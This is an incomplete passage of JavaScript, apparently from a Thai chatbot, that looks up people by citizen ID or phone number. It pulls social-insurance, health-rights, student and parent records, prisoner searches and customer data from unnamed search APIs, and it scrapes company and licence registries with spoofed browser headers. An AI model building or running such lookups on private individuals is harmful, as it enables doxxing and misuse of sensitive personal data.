// เดาโหมดจากค่าที่ผู้ใช้พิมพ์มา
function detectPwaMeterStatMode(value) {
  const input = String(value || '').trim();

  if (/^(นาย|นาง|นางสาว|น\.ส\.|ด\.ช\.|ด\.ญ\.|นพ\.|พญ\.|ว่าที่)/.test(input)) {
    return 'custname';
  }

  if (/(ตำบล|อำเภอ|จังหวัด|แขวง|ถนน|ซอย|หมู่|ม\.|ต\.|อ\.|จ\.|ถ\.|ซ\.)/.test(input)) {
    return 'custaddr';
  }

  if (/^[0-9A-Za-z][0-9A-Za-z./-]{2,}$/.test(input)) {
    return 'meterno';
  }

  return 'custname';
}

function pwaMeterStatModeLabel(mode) {
  if (mode === 'custaddr') return 'ที่อยู่ผู้ใช้น้ำ';
  if (mode === 'meterno') return 'หมายเลขมาตรวัดน้ำ';

  return 'ชื่อผู้ใช้น้ำ';
}

// ต้นทางค้นด้วยค่าที่ตรงทั้งค่าเท่านั้น จึงลองตามโหมดที่เดาไว้ก่อน แล้วค่อยลองโหมดอื่น
async function searchPwaMeterStatWithFallback({ branch, value, mode }) {
  const order = [mode, 'custname', 'custaddr', 'meterno']
    .filter((item, index, list) => list.indexOf(item) === index);

  let lastData = null;

  for (const currentMode of order) {
    const data = await fetchPwaMeterStatApi({
      pwa: branch,
      [currentMode]: value
    });

    // ต้นทาง/เซิร์ฟเวอร์ขัดข้อง ไม่ต้องลองโหมดอื่นต่อ
    if (data && data.success === false) {
      return { data, mode: currentMode };
    }

    lastData = data;

    if (data?.data?.found && Array.isArray(data.data.records) && data.data.records.length) {
      return { data, mode: currentMode };
    }
  }

  // ไม่เจอสักโหมด — รายงานโหมดที่เดาไว้ตั้งแต่แรก ไม่ใช่โหมดสุดท้ายที่ลอง
  return { data: lastData, mode };
}

function formatPwaMeterStatResult(data, { branch, value, mode }) {
  if (!data || data.success === false) {
    return limitLineMessage(
      '❌ ค้นหาข้อมูลมาตรวัดน้ำ (กปภ.) ไม่สำเร็จ\n\n' +
      (data?.message || data?.error || 'ระบบต้นทางไม่ตอบสนอง กรุณาลองใหม่อีกครั้ง')
    );
  }

  const query = data.data?.query || {};
  const branchName = query.branches?.[0]?.branch_name || branch;

  if (!data.data?.found) {
    const modeLabel = pwaMeterStatModeLabel(mode);

    return limitLineMessage(
      ` ไม่พบข้อมูลมาตรวัดน้ำ (กปภ.)

` +
      `◇ สาขาที่ระบุ
  ${branchName}\n` +
      ` ค้นหา (${modeLabel}) : ${value}\n\n` +
      `ลองพิมพ์ชื่อ-สกุล ที่อยู่ หรือหมายเลขมาตรให้ครบขึ้น\n` +
      `หรือตรวจสอบชื่อสาขาอีกครั้ง`
    );
  }

  return limitLineMessage(
    ` ${branchName} • ${pwaMeterStatModeLabel(query.mode || mode)} : ${value}\n\n` +
    String(data.message || '').trim()
  );
}

// =====================================
// SI : AUTHORIZED DATA ADAPTER
// =====================================
async function queryAuthorizedSiData({
  citizenId,
  requesterUserId,
  requesterPhone
}) {

  const id =
    String(citizenId || '')
      .replace(/\D/g, '');


  if (!/^\d{13}$/.test(id)) {
    throw new Error(
      'เลขบัตรประชาชนไม่ถูกต้อง'
    );
  }


  const apiBase =
    process.env.SI_API_BASE_URL;

  const apiKey =
    process.env.SI_API_KEY;


  if (!apiBase) {
    throw new Error(
      'SI_API_BASE_URL not configured'
    );
  }


  if (!apiKey) {
    throw new Error(
      'SI_API_KEY not configured'
    );
  }


  // ===============================
  // Audit - ไม่บันทึกเลขบัตรเต็ม
  // ===============================
  console.log(
    'AUTHORIZED SI REQUEST:',
    {
      requesterUserId:
        requesterUserId || '-',

      requesterPhone:
        requesterPhone || '-',

      citizenIdMasked:
        '*********' +
        id.slice(-4)
    }
  );


  // ===============================
  // เรียก API ฝั่ง Server เท่านั้น
  // ===============================
  const response =
    await axios.get(
      apiBase,
      {
        timeout: 30000,

        params: {
          si: id,
          key: apiKey
        },

        headers: {
          Accept:
            'application/json, text/plain, */*',

          'Accept-Language':
            'th-TH,th;q=0.9,en;q=0.8',

          'User-Agent':
            'NECT/1.0'
        }
      }
    );


  const data =
    response.data;


  if (!data) {
    throw new Error(
      'SI API returned empty response'
    );
  }


  return data;
}

async function fetchPrisonerApi(params, base = SEARCH_API_BASE) {
  const first = await fetchSearchApiRaw(params, base);
  const hasRows = Array.isArray(first?.data?.content) || Array.isArray(first?.content);
  if (first?.success || hasRows) return first;

  await new Promise(resolve => setTimeout(resolve, 700));
  return fetchSearchApiRaw(params, base);
}

async function fetchNhsoRightApi(citizenId) {
  const { data: res } = await axios.get(SEARCH_API_BASE, {
    params: { nh: citizenId, key: SEARCH_API_KEY },
    timeout: 120000
  });
  return res;
}

async function fetchDxcMessageApi(params, base = SECURE_SEARCH_API_BASE, backupBase = DXC_BACKUP_API_BASE) {
  const tryRequest = async (url) => {
    const { data } = await axios.get(url, {
      params: { ...params, key: SEARCH_API_KEY },
      timeout: 120000
    });
    return data;
  };

  try {
    const res = await tryRequest(base);
    if (res?.success === false) {
      console.error(`DXC หลัก (${base}) ไม่ success ใช้สำรอง (${backupBase}):`, res?.message || 'no success');
      return await tryRequest(backupBase);
    }
    return res;
  } catch (err) {
    console.error(`DXC หลัก (${base}) ล่ม ใช้สำรอง (${backupBase}):`, err?.response?.data || err.message);
    return await tryRequest(backupBase);
  }
}

function formatNhsoRightApiResult(res, citizenId) {
  if (!res?.success) {
    return `❌ ${res?.message || `ไม่พบข้อมูลสิทธิสำหรับเลขบัตร ${citizenId}`}`;
  }

  const data = res.data || {};
  const personal = data.personal || {};
  const historyRows = Array.isArray(data.historyRows) ? data.historyRows : [];
  const currentRight = data.currentRight || {};
  const value = (...items) => items.find(item => item !== undefined && item !== null && String(item).trim() !== '') || '-';
  const hasValue = item => item !== undefined && item !== null && String(item).trim() !== '' && String(item).trim() !== '-';

  const lines = [
    `◇ ชื่อและนามสกุล
  ${value(personal.fullName)}`,
    `• เพศ: ${value(personal.gender)}`,
    `• เดือนปีเกิด: ${value(personal.birthMonth)}`,
    `• สถานภาพ: ${value(personal.statusDola)}`,
    '',
    "• สิทธิการรักษาปัจจุบัน",
    `◇ สิทธิการรักษาหลัก
  ${value(currentRight.mainInscl)}`,
    `◇ ประเภทของสิทธิย่อย
  ${value(currentRight.subInscl)}`,
    `• รหัสบัตรประกันสุขภาพ: ${value(currentRight.cardId)}`,
    `• จังหวัดที่ลงทะเบียนรักษา: ${value(currentRight.ucProvince)}`,
    `◇ ชื่อหน่วยบริการปฐมภูมิ
  ${value(currentRight.hsub)}`,
    `◇ ชื่อหน่วยบริการประจำ
  ${value(currentRight.hmainOp)}`,
    `◇ ชื่อหน่วยบริการรับส่งต่อ
  ${value(currentRight.hmain)}`,
    '',
    ` ประวัติการเปลี่ยนสิทธิ์ (${historyRows.length} รายการ)`
  ];

  const pushHistoryLine = (block, label, item, prefix = "• ") => {
    if (hasValue(item)) block.push(`${prefix} ${label}: ${item}`);
  };

  historyRows.forEach((row, index) => {
    const block = ['', `• รายการที่ ${index + 1}`];
    pushHistoryLine(block, 'วันที่เปลี่ยนแปลง', row.changedAt);
    pushHistoryLine(block, 'จังหวัด', row.province);
    pushHistoryLine(block, 'สิทธิ', row.rightName);
    pushHistoryLine(block, 'ประเภท', row.subRight);
    pushHistoryLine(block, 'เลขบัตรสิทธิ', row.cardId);
    pushHistoryLine(block, 'เริ่มใช้สิทธิ', row.startDate);
    pushHistoryLine(block, 'หมดอายุ', row.expireDate);
    pushHistoryLine(block, 'หน่วยบริการหลัก', row.hospMain);
    pushHistoryLine(block, 'หน่วยบริการปฐมภูมิ', row.hospSub);
    block.push(`• สถานะ: ${value(row.status)}`);
    lines.push(...block);
  });

  return limitLineMessage(lines.join('\n'));
}

async function fetchOpecStudentApi(citizenId) {
  const { data: res } = await axios.get(SEARCH_API_BASE, {
    params: { opec: citizenId, key: SEARCH_API_KEY },
    timeout: 120000
  });
  return res;
}

function formatOpecStudentResult(res, citizenId) {
  if (!res?.success) return `❌ ${res?.message || `ไม่พบข้อมูลนักเรียน ${citizenId}`}`;
  if (res.message) return limitLineMessage(res.message);

  const data = res.data || {};
  const address = data.address || {};
  const father = data.family?.father || data.father || {};
  const mother = data.family?.mother || data.mother || {};
  const fullName = `${data.prefix || ''}${data.firstNameTh || ''} ${data.lastNameTh || ''}`.trim() || '-';
  const lines = [
    " ข้อมูลนักเรียน (OPEC)",
    "────────────",
    `◇ หมายเลขประจำตัวประชาชน
  ${data.idcard || citizenId}`,
    `◇ ชื่อและนามสกุล
  ${fullName}`,
    data.gender ? `เพศ: ${data.gender}` : '',
    data.birthdate ? `◇ วันเดือนปีเกิด
  ${data.birthdate}` : '',
    data.nationality ? `◇ สัญชาติที่ระบุ
  ${data.nationality}` : '',
    address.full ? `
 ที่อยู่
${address.full}` : '',
    father.name ? `
 บิดา
${father.name}${father.idCard ? `\nเลข ปชช: ${father.idCard}` : ''}` : '',
    mother.name ? `
 มารดา
${mother.name}${mother.idCard ? `\nเลข ปชช: ${mother.idCard}` : ''}` : ''
  ].filter(Boolean);
  return limitLineMessage(lines.join('\n'));
}

async function fetchDPlusCustomerApi(phone) {
  const bases = [DPLUS_API_BASE, SEARCH_API_BASE].filter((base, index, list) => list.indexOf(base) === index);
  let lastError;
  for (const base of bases) {
    try {
      const { data } = await axios.get(base, {
        params: { f: phone, key: SEARCH_API_KEY },
        timeout: 45000
      });
      return data;
    } catch (error) {
      lastError = error;
      console.error(`DPlus API (${base}) ล่ม:`, error?.response?.data || error.message);
    }
  }
  throw lastError;
}

function stripHtml(value) {
  return String(value || '')
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/<style[\s\S]*?<\/style>/gi, '')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/g, ' ')
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/\s+/g, ' ')
    .trim();
}

function parseDataForThaiCompanyHtml(html, fallbackId = '', fallback = {}) {
  const $ = cheerio.load(html || '');
  const clean = value => stripHtml(value).replace(/\s+/g, ' ').trim();
  const normalize = value => clean(value).replace(/\s+/g, '');
  const getValueByLabel = (...labels) => {
    const normalizedLabels = labels.map(normalize).filter(Boolean);
    let value = '';
    $('td').each((_, el) => {
      if (value) return;
      const label = normalize($(el).clone().children().remove().end().text() || $(el).text());
      if (!normalizedLabels.some(item => label === item || label.includes(item))) return;
      const next = $(el).next();
      value = clean(next.html() || next.text());
    });
    return value;
  };

  let address = '';
  let mapLink = '';
  $('td').each((_, el) => {
    const label = normalize($(el).clone().children().remove().end().text() || $(el).text());
    if (!label.includes('ที่ตั้ง') || address) return;
    const next = $(el).next();
    const a = next.find('a.noselect, a[href*="maps/search"], a').first();
    address = clean(a.length ? a.text() : next.text());
    mapLink = a.attr('href') || next.find('a[href*="maps"]').first().attr('href') || '';
  });

  const websites = [];
  $('td').each((_, el) => {
    const label = normalize($(el).clone().children().remove().end().text() || $(el).text());
    if (!label.includes('เว็บไซต์')) return;
    $(el).next().find('a').each((__, a) => {
      const text = clean($(a).text());
      if (text && !websites.includes(text)) websites.push(text);
    });
  });

  const business = getValueByLabel('ประกอบธุรกิจ')
    .replace(/ค้นหาผู้ประกอบการธุรกิจเดียวกัน/g, '')
    .replace(/\s*หมวดธุรกิจ\s*[:：]?\s*/i, '\nหมวดธุรกิจ: ')
    .replace(/\s*ธุรกิจที่ส่งงบการเงินล่าสุด\s*/i, '\nธุรกิจที่ส่งงบการเงินล่าสุด: ')
    .trim();

  return {
    jp_no: getValueByLabel('เลขทะเบียน') || fallback.jp_no || fallbackId,
    jp_tname: clean($('h2').first().text()) || fallback.jp_tname || fallback.full_tname || '',
    full_tname: fallback.full_tname || clean($('h2').first().text()) || '',
    name_en: clean($('h3').first().text()) || fallback.name_en || '',
    obj_name_keyin: fallback.obj_name_keyin || '',
    detail: {
      business,
      status: getValueByLabel('สถานะ'),
      regDate: getValueByLabel('วันที่จดทะเบียน'),
      capital: getValueByLabel('ทุนจดทะเบียน'),
      address,
      mapLink,
      websites
    }
  };
}

async function fetchDataForThaiCompany(searchText) {
  try {
    const form = new URLSearchParams();
    form.append('mode', 'search_comp');
    form.append('data[searchtext]', searchText);

    const apiRes = await axios.post('https://www.dataforthai.com/api/company', form.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        Accept: 'application/json, text/javascript, */*; q=0.01',
        Origin: 'https://www.dataforthai.com',
        Referer: 'https://www.dataforthai.com/',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
      },
      timeout: 15000
    });

    const rows = Array.isArray(apiRes.data?.data)
      ? apiRes.data.data
      : Array.isArray(apiRes.data?.result)
        ? apiRes.data.result
        : Array.isArray(apiRes.data)
          ? apiRes.data
          : [];

    if (!rows.length && !/^\d{13}$/.test(String(searchText).trim())) {
      return { ok: false, message: 'ไม่พบผลจาก DataForThai' };
    }

    const first = rows[0] || {};
    const firstText = typeof first === 'string' ? first : JSON.stringify(first);
    const jpNo = first.jp_no ||
      first.jpNo ||
      first.jp_no_text ||
      first.juristic_id ||
      first.register_no ||
      String(searchText).match(/\d{13}/)?.[0] ||
      String(firstText).match(/\d{13}/)?.[0] ||
      '';

    if (!jpNo) return { ok: false, message: 'ไม่พบเลขทะเบียนจาก DataForThai' };

    let detailHtml = '';

    try {
      const detailRes = await axios.get(`https://www.dataforthai.com/company/${jpNo}/`, {
        headers: {
          Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'th,en;q=0.9',
          Referer: 'https://www.dataforthai.com/',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
        },
        timeout: 15000
      });
      detailHtml = detailRes.data;
    } catch {
      detailHtml = '';
    }

    const summary = detailHtml
      ? parseDataForThaiCompanyHtml(detailHtml, jpNo, first)
      : {
          jp_no: jpNo,
          jp_tname: first.jp_tname || first.full_tname || '',
          obj_name_keyin: first.obj_name_keyin || '',
          full_tname: first.full_tname || '',
          detail: { business: '', status: '', regDate: '', capital: '', address: '', mapLink: '', websites: [] }
        };

    return {
      ok: true,
      summary
    };
  } catch (error) {
    const directId = String(searchText || '').match(/\d{13}/)?.[0] || '';
    if (directId) {
      try {
        const detailRes = await axios.get(`https://www.dataforthai.com/company/${directId}/`, {
          headers: {
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'th,en;q=0.9',
            Referer: 'https://www.dataforthai.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
          },
          timeout: 15000
        });
        return {
          ok: true,
          summary: parseDataForThaiCompanyHtml(detailRes.data, directId, { jp_no: directId })
        };
      } catch {}
    }
    return { ok: false, message: 'สืบค้นใหม่อีกครั้ง DataForThai: ' + (error.response?.status || error.message) };
  }
}

function formatDataForThaiSummary(summary) {
  let business = (summary.detail.business || '').replace(/\s{2,}/g, ' ').trim();
  let mainBiz = business;
  let bizCat = '';

  if (business.includes('หมวดธุรกิจ:')) {
    [mainBiz, bizCat] = business.split('หมวดธุรกิจ:');
    mainBiz = mainBiz.trim();
    bizCat = bizCat.trim();
  }

  let msg = " ▸ สรุปบริษัทจาก DataForThai\n────────────\n";
  msg += `◇ หมายเลขทะเบียน (JP No)
  ${summary.jp_no || '-'}\n`;
  msg += `◇ ชื่อของกิจการ
  ${summary.jp_tname || summary.full_tname || '-'}\n`;
  if (summary.name_en) msg += `◇ ชื่อภาษาอังกฤษ
  ${summary.name_en}\n`;
  if (summary.obj_name_keyin) msg += ` ชื่อที่ป้อน: ${summary.obj_name_keyin}\n`;
  msg += "\n รายละเอียดบริษัท\n";
  msg += `• สถานะ: ${summary.detail.status || '-'}\n`;
  msg += `• ธุรกิจ: ${mainBiz || '-'}\n`;
  if (bizCat) msg += `◇ หมวดของธุรกิจ
  ${bizCat}\n`;
  msg += `• จดทะเบียน: ${summary.detail.regDate || '-'}\n`;
  msg += `◇ จำนวนทุนจดทะเบียน
  ${summary.detail.capital || '-'}\n`;
  if (summary.detail.address) msg += `◇ ตำแหน่งที่ตั้ง
  ${summary.detail.address}\n`;
  if (summary.detail.mapLink) msg += `• แผนที่: ${summary.detail.mapLink}\n`;
  if (Array.isArray(summary.detail.websites) && summary.detail.websites.length) {
    msg += `◇ ที่อยู่เว็บไซต์
  ${summary.detail.websites.join(', ')}\n`;
  }
  return msg.trim();
}

async function searchBOTLicenseByBrowser(keyword) {
  let browser;
  try {
    const { chromium } = require('playwright');
    browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();

    await page.goto('https://app.bot.or.th/BOTLicenseCheck/', { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForSelector('#inputSearchName', { timeout: 10000, state: 'visible' });
    await page.fill('#inputSearchName', keyword);
    await page.click('button.btn-title-search');
    await page.waitForSelector('div.top.bot-license a.comp-name', { timeout: 10000 });

    const href = await page.getAttribute('div.top.bot-license a.comp-name', 'href');
    if (!href) return null;

    await page.goto(new URL(href, 'https://app.bot.or.th').toString(), { waitUntil: 'domcontentloaded', timeout: 30000 });
    const $ = cheerio.load(await page.content());

    const title = $('h2.c-header-custom').text().trim();
    const branchType = $('span.sub-header').first().text().trim();
    const address = $('div.bot-comp-header span.sub-header').eq(1).text().trim();
    const infoDateTime = $('p.shown-date').text().replace('ข้อมูล ณ วันที่', '').trim();
    const [infoDate, infoTime] = infoDateTime.split('เวลา').map(s => (s || '').trim() || '-');
    const licenseRows = [];

    $('div.level3-header8').each((_, el) => {
      const type = $(el).find('.comp-info p').text().trim();
      const status = $(el).find('.comp-info button').text().trim();
      const dates = [];
      $(el).find('.title-and-date .date').each((__, d) => dates.push($(d).text().trim()));
      licenseRows.push({
        type,
        status,
        dateStart: dates[0] || '-',
        dateEnd: dates[dates.length - 1] || '-'
      });
    });

    let msg = " BOT License\n────────────\n";
    msg += `◇ ชื่อที่ระบุ
  ${title || '-'}\n`;
    if (branchType) msg += `ประเภทสาขา: ${branchType}\n`;
    if (address) msg += `◇ ตำแหน่งที่ตั้ง
  ${address}\n`;
    msg += `ข้อมูล ณ: ${infoDate || '-'} ${infoTime || ''}\n\n`;
    if (licenseRows.length) {
      msg += 'ใบอนุญาต / การขึ้นทะเบียน:\n';
      licenseRows.forEach((row, idx) => {
        msg += `${idx + 1}. ${row.type || '-'} ${row.status ? `(${row.status})` : ''}\n`;
        msg += `   ได้รับ: ${row.dateStart}\n`;
        msg += `   สิ้นสุด: ${row.dateEnd}\n`;
      });
    }

    return msg;
  } catch {
    return null;
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

async function searchBOTLicense(keyword) {
  try {
    const parts = [];
    const dft = await fetchDataForThaiCompany(keyword);
    if (dft.ok) parts.push(formatDataForThaiSummary(dft.summary));

    const browserResult = await searchBOTLicenseByBrowser(keyword);
    if (browserResult && !browserResult.includes('❌')) parts.push(browserResult);

    const combined = parts.filter(Boolean).join("\n\n────────────\n\n");
    return combined ? limitLineMessage(combined) : '❌ ไม่พบข้อมูลบริษัทหรือใบอนุญาต';
  } catch {
    return 'สืบค้นใหม่อีกครั้ง BOT License';
  }
}

async function searchCompanyDataforthai(id) {
  try {
    const dft = await fetchDataForThaiCompany(id);
    if (!dft.ok) return `❌ ${dft.message || `ไม่พบข้อมูลบริษัทสำหรับเลขทะเบียนนี้ (${id})`}`;
    const summary = dft.summary || {};
    const detail = summary.detail || {};
    if (!summary.jp_tname && !summary.full_tname && !summary.name_en) return `❌ ไม่พบข้อมูลบริษัทสำหรับเลขทะเบียนนี้ (${id})`;

    return ` ข้อมูลบริษัท
────────────
◇ ชื่อของบริษัท
  ${summary.jp_tname || summary.full_tname || '-'}
 (EN): ${summary.name_en || '-'}
 เลขทะเบียน: ${summary.jp_no || id}
 ประเภทธุรกิจ: ${detail.business || '-'}
◇ วันจดทะเบียน
  ${detail.regDate || '-'}
◇ จำนวนทุนจดทะเบียน
  ${detail.capital || '-'}
◇ ตำแหน่งที่ตั้ง
  ${detail.address || '-'}
${detail.mapLink ? ` แผนที่: ${detail.mapLink}` : ''}
${Array.isArray(detail.websites) && detail.websites.length ? `◇ ที่อยู่เว็บไซต์
  ${detail.websites.join(', ')}` : ''}
 สถานะ: ${detail.status || '-'}
────────────`;
  } catch (e) {
    return `❌ สืบค้นใหม่อีกครั้ง  DataForThai: ${e.message}`;
  }
}

async function searchLoanLicense(appName) {
  try {
    const keyword = encodeURIComponent(appName.trim());
    const url = `https://www.bot.or.th/content/bot/th/license-loan/jcr:content/root/container/superlist_442030069.superListingResults.15.0.ascending.json/sortOrderMap/ascending/keyword/${keyword}`;
    const response = await axios.get(url, { httpsAgent });
    const data = response.data;

    if (!data.success || !data.results || data.results.length === 0) {
      return '❌ ไม่พบข้อมูลใบอนุญาตสินเชื่อสำหรับแอปนี้';
    }

    let msg = ` ข้อมูลใบอนุญาตสินเชื่อ (${appName})\n\n`;
    data.results.forEach((item, idx) => {
  const row = item.rowData || {};

  msg += `• ลำดับ ${idx + 1}\n`;
  msg += `• แอป: ${stripHtml(row.nameapp)}\n`;
  msg += `• บริษัท: ${stripHtml(row.namecompany)}\n`;
  msg += `• ติดต่อ: ${stripHtml(row.contact)}\n`;
  msg += `• ลิงก์: ${stripHtml(row.link)}\n\n`;
});

    return limitLineMessage(msg);
  } catch (e) {
    return '❌ สืบค้นใหม่อีกครั้ง : ' + e.message;
  }
}

async function searchThaiTruckCenter(searchText) {
  const SEARCH_URL = 'https://www.thaitruckcenter.com/tdsc/2Product/CompanyV_4';
  const baseHeaders = () => ({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
    Connection: 'keep-alive'
  });
  const session = axios.create({ withCredentials: true, headers: baseHeaders() });

  const getHiddenFields = async () => {
    const res = await session.get(SEARCH_URL);
    const $ = cheerio.load(res.data);
    const get = (name) => $(`input[name='${name}']`).attr('value') || '';
    return {
      __VIEWSTATE: get('__VIEWSTATE'),
      __VIEWSTATEGENERATOR: get('__VIEWSTATEGENERATOR'),
      __EVENTVALIDATION: get('__EVENTVALIDATION')
    };
  };

  const hidden = await getHiddenFields();
  const form = new URLSearchParams();
  form.append('__VIEWSTATE', hidden.__VIEWSTATE);
  form.append('__VIEWSTATEGENERATOR', hidden.__VIEWSTATEGENERATOR);
  form.append('__EVENTVALIDATION', hidden.__EVENTVALIDATION);
  form.append('__EVENTTARGET', 'BtnSearch');
  form.append('__EVENTARGUMENT', '');
  form.append('__LASTFOCUS', '');
  form.append('txtBoxComp', searchText);
  form.append('ddlProvince', 'ค้นหาจังหวัดของผู้ประกอบการ');
  form.append('ddlSize', '0');
  form.append('ddlGroup', '0');
  form.append('ddlSubGroup', '1');

  const res = await session.post(SEARCH_URL, form.toString(), {
    headers: { ...baseHeaders(), 'Content-Type': 'application/x-www-form-urlencoded' }
  });
  const $ = cheerio.load(res.data);
  const a = $("a[id^='GridViewCompany_link_']").first();
  if (!a.length) return null;

  const detailUrl = new URL(a.attr('href') || '', SEARCH_URL).toString().replace('CompanyInfo.aspx', 'CompanyInfo');
  const rowTds = a.closest('tr').find('td');
  const detailRes = await session.get(detailUrl);
  const detail$ = cheerio.load(detailRes.data);
  const text = (sel) => detail$(sel).first().text().trim() || null;
  const carTypes = [];
  detail$('#ContentPlaceHolder1_CarTypeTable tr').each((_, tr) => {
    const type = detail$(tr).find('td').first().text().trim();
    if (type) carTypes.push({ type });
  });

  return {
    type: $(rowTds[1]).text().trim() || null,
    licenseNo: $(rowTds[2]).text().trim() || null,
    province: $(rowTds[4]).text().trim() || null,
    companyName: text('#ContentPlaceHolder1_lblcomp_name2') || a.text().trim() || null,
    detail: text('#ContentPlaceHolder1_lbldetail'),
    route: text('#ContentPlaceHolder1_lbltransport_route'),
    products: text('#ContentPlaceHolder1_lblproduct'),
    phone: text('#ContentPlaceHolder1_lblphone'),
    email: text('#ContentPlaceHolder1_lblemail'),
    website: text('#ContentPlaceHolder1_lblwebsite'),
    address: text('#ContentPlaceHolder1_lbladress'),
    service: text('#ContentPlaceHolder1_lblservice'),
    carTypes
  };
}

function formatThaiTruckCenterResult(result) {
  if (!result) return '❌ ไม่พบข้อมูลบริษัทที่ระบุหรือเกิดข้อผิดพลาด';
  const carList = (result.carTypes || []).map(ct => `- ${ct.type}`).join('\n') || '-';
  return `บริษัท: ${result.companyName || '-'}
ประเภท: ${result.type || '-'}
◇ หมายเลขใบอนุญาต
  ${result.licenseNo || '-'}
◇ จังหวัดที่ระบุ
  ${result.province || '-'}

รายละเอียด:
${result.detail || '-'}

เส้นทางการขนส่ง:
${result.route || '-'}

สินค้า:
${result.products || '-'}

◇ เบอร์โทรที่ระบุ
  ${result.phone || '-'}
◇ ที่อยู่อีเมล
  ${result.email || '-'}
◇ ที่อยู่เว็บไซต์
  ${result.website || '-'}

◇ รายละเอียดที่อยู่
  
${result.address || '-'}

การให้บริการ:
${result.service || '-'}

ประเภท / จำนวนรถ:
${carList}`;
}

function calculateCCTVTimeDiff(cameraTime, realTime) {
  const timePattern = /^([01]?\d|2[0-3]):([0-5]\d):([0-5]\d)$/;
  if (!timePattern.test(cameraTime) || !timePattern.test(realTime)) {
    return 'รูปแบบเวลาไม่ถูกต้อง กรุณาใช้รูปแบบ HH:MM:SS';
  }

  const [camHours, camMinutes, camSeconds] = cameraTime.split(':').map(Number);
  const [realHours, realMinutes, realSeconds] = realTime.split(':').map(Number);
  let diffSeconds = (camHours * 3600 + camMinutes * 60 + camSeconds) - (realHours * 3600 + realMinutes * 60 + realSeconds);
  if (diffSeconds < 0) diffSeconds += 24 * 3600;

  const hours = Math.floor(diffSeconds / 3600);
  diffSeconds %= 3600;
  const minutes = Math.floor(diffSeconds / 60);
  const seconds = diffSeconds % 60;

  return ` การคำนวณความต่างของเวลา CCTV
────────────
 เวลาในกล้อง: ${cameraTime}
 เวลาจริง: ${realTime}
 เวลาต่างกัน: ${hours} ชั่วโมง ${minutes} นาที ${seconds} วินาที
────────────`;
}

async function searchTISI(licenseId) {
  try {
    const payload = new URLSearchParams();
    payload.append('n', licenseId);

    const response = await axios.post('https://a.tisi.go.th/l/', payload, {
      headers: {
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.7',
        'Content-Type': 'application/x-www-form-urlencoded',
        Origin: 'https://appdb.tisi.go.th',
        Referer: 'https://appdb.tisi.go.th/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
      },
      httpsAgent,
      timeout: 30000
    });

    const $ = cheerio.load(response.data);
    const get = (label) => $(`div.col-xs-12:contains("${label}") font:last, div.col-xs-6:contains("${label}") font:last`).first().text().trim();
    let details = '';
    $('div.col-xs-12:contains("รายละเอียด") + div.col-xs-12 ul li').each((_, elem) => {
      details += `• ${$(elem).text().trim()}\n`;
    });

    return ` ข้อมูลใบอนุญาต TISI
────────────
 เลขที่ใบอนุญาต: ${get('เลขที่ใบอนุญาต') || '-'}
 วันที่ออก: ${get('วันที่ออกใบอนุญาต') || '-'}
 เลข มอก.: ${get('เลข มอก.') || '-'}
 ประเภท: ${get('ประเภท') || '-'}

 ข้อมูลผู้รับใบอนุญาต
◇ ชื่อที่ระบุ
  ${get('ผู้รับใบอนุญาต') || '-'}
เลขประจำตัวผู้เสียภาษี: ${get('เลขประจำตัวผู้เสียภาษี') || '-'}
◇ รายละเอียดที่อยู่
  ${get("◇ รายละเอียดที่อยู่\n  ") || '-'}

 ข้อมูลโรงงาน
ชื่อโรงงาน: ${get('ชื่อโรงงาน') || '-'}
ทะเบียนโรงงาน: ${get('ทะเบียนโรงงาน') || '-'}
ที่อยู่โรงงาน: ${get('ที่อยู่โรงงาน') || '-'}

 รายละเอียดเพิ่มเติม
${details || 'ไม่มีรายละเอียดเพิ่มเติม'}
────────────`;
  } catch (error) {
    return 'สืบค้นใหม่อีกครั้ง  TISI: ' + error.message;
  }
}

function firstMatch(text, regex, fallback = '') {
  const match = String(text || '').match(regex);
  return match ? match[1].trim() : fallback;
}

function extractDLAField(text, label) {
  const escaped = label.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const match = text.match(new RegExp(`${escaped}\\s*:\\s*([^:]+?)(?=\\s*(?:อปท|อำเภอ|จังหวัด|เบอร์ติดต่อ)\\s*:|$)`));
  return match ? match[1].trim() : '';
}

function extractDLASpanField(html, label) {
  const escaped = label.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const regex = new RegExp(`<span\\b[^>]*>\\s*${escaped}\\s*:\\s*([\\s\\S]*?)<\\/span>`, 'i');
  const match = String(html || '').match(regex);
  return match ? stripHtml(match[1]).trim() : '';
}

function extractClassTexts(html, className) {
  const output = [];
  const regex = new RegExp(`<[^>]*class=["'][^"']*\\b${className}\\b[^"']*["'][^>]*>([\\s\\S]*?)<\\/[^>]+>`, 'gi');
  let match;
  while ((match = regex.exec(html))) {
    const value = stripHtml(match[1]);
